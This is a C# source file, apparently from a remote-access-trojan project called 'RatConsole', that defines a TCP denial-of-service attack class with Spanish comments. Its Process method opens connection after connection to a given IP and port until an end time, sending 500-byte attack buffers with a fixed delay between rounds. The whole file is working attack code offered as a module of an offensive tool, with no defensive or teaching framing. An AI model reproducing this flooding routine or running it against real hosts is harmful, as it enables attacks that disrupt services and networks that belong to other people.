using System;
using System.Net.Sockets;

namespace RatConsole.Domain.Services.DoS
{
	/// <summary>
	///		Clase para llevar a cabo un ataque DoS utilizando Tcp
	/// </summary>
	internal class TcpDosAttack : AbstractDoSAttack
	{
		internal TcpDosAttack(string ip, int port, TimeSpan delay, DateTime end) : base(ip, port, delay, end)
		{
		}

		/// <summary>
		///		Procesa el ataque
		/// </summary>
		internal override void Process()
		{
			while (!CheckEnd())
                try
                {
					// Lanza el ataque
                    using (TcpClient client = new TcpClient())
					{
						// Conecta al servidor
						client.Connect(Ip, Port);
						// Envía los datos al servidor
						using (NetworkStream stream = client.GetStream())
						{
							byte[] buffer = GetAttackData(500);

								// Envía los datos al servidor
								stream.Write(buffer, 0, buffer.Length);
								// Cierra el stream
								stream.Close();
						}
						// Cierra la conexión
						client.Close();
					}
					// Espera
					Wait();
                }
                catch (Exception ex)
                {
                    System.Diagnostics.Debug.WriteLine("DoS TCP error: " + ex.Message);
                }
		}
	}
}
